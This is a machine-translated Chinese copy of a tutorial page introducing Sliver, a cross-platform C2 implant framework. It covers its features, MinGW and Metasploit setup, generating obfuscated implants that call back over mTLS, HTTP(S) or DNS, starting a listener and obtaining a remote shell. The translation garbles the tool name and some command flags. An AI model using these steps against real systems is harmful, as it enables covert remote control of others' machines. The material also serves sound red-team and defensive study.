# 银:植入物框架

> 原文：<https://kalilinuxtutorials.com/sliver-implant-framework/>

**silver**是一个通用的跨平台植入框架，支持基于 Mutual-TLS、HTTP(S)和 DNS 的 C2。植入是用唯一的 X.509 证书动态编译的，该证书由第一次运行二进制文件时生成的每个实例的证书颁发机构签名。

服务器、客户端和植入物都支持 MacOS、Windows 和 Linux(可能支持每一个 Golang 编译器目标，但我们没有对它们全部进行测试)。

**警告:**条子目前在**阿尔法**，你已经被警告了

**特性**

*   动态代码生成
*   编译时混淆
*   本地和远程过程注入
*   反反反反取证
*   [通过 mTLS、HTTP(S)和 DNS 保护 C2](https://github.com/BishopFox/sliver/wiki/Transport-Encryption)
*   Windows 进程迁移
*   Windows 用户令牌操作
*   多人模式
*   通过 HTTP 程序生成的 C2*(工作进行中)*
*   让我们加密集成
*   内存中。NET 程序集执行
*   [DNS 金丝雀](https://github.com/BishopFox/sliver/wiki/DNS-C2#dns-canaries)蓝队检测

**也可阅读:[Konan-高级网络应用目录扫描仪](https://kalilinuxtutorials.com/konan-web-application-dir-scanner/)**

**入门**

该服务器支持 Linux、Windows 和 MacOS，但是我们建议在 Linux 主机上运行该服务器，一些功能在 Windows 或 MacOS 服务器上运行可能会更困难，但是所有基本的内置功能都应该工作正常。

为您的平台下载最新的[版本](https://github.com/BishopFox/sliver/releases)，并运行二进制文件。第一次运行服务器时，它需要解包一些资产，这可能需要一两分钟，随后的启动应该会更快。

**注意:**silver 对可选特性有两个外部依赖:MinGW 和 Metasploit。要启用外壳代码/分段有效负载，您需要安装 MinGW。要启用 MSF 集成，您需要安装 Metasploit。

Sliver 的构建主要是为运行单元测试而设计的，但是同时包含了 MinGW 和 Metasploit。如果您计划使用 Docker 运行服务器，您需要自己转发适当的 TCP 端口(例如 80、443、31337)。

**MinGW 设置**

为了启用 shellcode/staged/DLL 有效负载，您需要在服务器上安装 MinGW(连接到服务器的客户端不需要安装)。默认情况下，Sliver 将在通常的地方查找 MinGW 二进制文件，但是您可以使用[环境变量](https://github.com/BishopFox/sliver/wiki/Environment-Variables) `SLIVER_CC`来覆盖它。

**Linux**

**apt-get 安装 mingw-w64 binutils-mingw-w64 g++ mingw-w64**

**MacOS**

**brew 安装 mingw-w64**

**Metasploit 设置**

我们强烈建议使用[夜间框架安装程序](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)，Sliver 期望版本 5 或更高版本。

**生成植入物**

使用`generate`命令生成植入物，必须使用`--mtls`、`--http`或`--dns`指定至少一个 C2 端点。注意，当一个植入试图连接到使用`--http`指定的端点时，它将尝试 HTTPS，然后尝试 HTTP(如果 HTTPS 失败)。

我们建议尽可能使用相互 TLS ( `--mtls`)。你也可以用`--save`指定一个输出目录，默认情况下植入会保存到当前工作目录。

**silver>generate–mtls example.com–save/Users/moloch/Desktop

[*]生成新的 windows/amd64 silver 二进制文件
[*]符号混淆已启用，此过程大约需要 15 分钟
[*]构建在 00:10:16
[*]silver 二进制文件保存到:/Users/moloch/Desktop/NEW _ grape . exe**

**重要提示:**根据服务器的 CPU 资源，符号混淆过程可能需要 15 分钟以上才能完成。您可以使用`--skip-symbols`跳过这一步，但是许多粗略的信息将会出现在生成的二进制文件中。如果你只是玩玩，或者不在乎潜行，你应该只使用这个标志。

银植入是跨平台的，您可以用`--os`标志改变编译器目标:

silver > generate–mtls example.com–save/Users/moloch/Desktop–skip-symbols–OS MAC

[*]生成新的 Darwin/amd64 silver 二进制文件
[！]符号混淆被禁用
[*]构建完成于 00:00:03
[*]银二进制文件保存到:/Users/moloch/Desktop/PROPER _ ANTHONY

服务器还将为每个生成的二进制文件分配代码名，即`NEW_GRAPE.exe`你可以根据需要将文件重命名为任何名称，但这些代码名仍将唯一标识生成的二进制文件(它们是在编译时插入的)。您还可以使用`slivers`命令查看所有先前生成的植入二进制文件:

```
sliver > slivers

Name                    OS/Arch        Debug  Format
====                    =======        =====  ======
CAUTIOUS_PANPIPE        darwin/amd64   false  EXECUTABLE
LATE_SUBCOMPONENT       windows/amd64  false  SHARED_LIB
RUBBER_PRINTER          windows/amd64  true   SHARED_LIB
RACIAL_SPECTACLES       darwin/amd64   false  EXECUTABLE
MATHEMATICAL_SASH       darwin/amd64   true   SHARED_LIB
MUSHY_TRADITIONALISM    windows/amd64  false  SHARED_LIB
SICK_SPY                darwin/amd64   false  EXECUTABLE

```

如果需要重新下载之前生成的植入，使用`regenerate`命令:

切片>重新生成–保存/Users/moloch/Desktop/NEW _ GRAPE

[*]切片二进制文件保存到:/Users/moloch/Desktop/NEW _ GRAPE . exe

**获取炮弹**

在捕捉 shell 之前，首先需要启动一个监听器。您使用命令`mtls`、`http`、`https`和`dns`来启动每个协议的监听器(记住用`--http`指定的端点可以连接到以`https`开始的监听器)。您可以使用`jobs`命令来查看和管理在后台运行的监听器。

```
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

ID  Name  Protocol  Port
==  ====  ========  ====
1   mTLS  tcp       8888 
```

在本例中，我们使用的是 Mutual TLS，设置和保护该连接所需的证书已经在后台生成，客户端证书对在编译时嵌入到植入物中。因此，要获得 shell，您只需在目标上运行二进制文件。

[*]Session # 1 PROPER _ ANTHONY–127 . 0 . 0 . 1:49929(narvi . local)-Darwin/amd64

silver>use 1

[*]Active silver PROPER _ ANTHONY(1)

silver(PROPER _ ANTHONY)>ls

/Users/moloch/Desktop
= = = = = = = = = = = = = = = = = =
。KiB DS _ Store 6.0
。本地化 0b
PROPER _ ANTHONY 6.3 MiB

**多个域/协议**

在生成过程中，您可以指定多个域和协议。现在，当连接失败时，Sliver 将首先尝试使用性能最好的协议(MTLS -> HTTP(S) -> DNS)，然后使用后续的域/协议。

silver > generate–mtls example.com–http foobar.com–DNS 1 . lil-peep . rip

最后，我们将添加一个功能来手动指定后备协议，或者您可以添加这个功能并发送一个 PR。

[**Download**](https://github.com/BishopFox/sliver)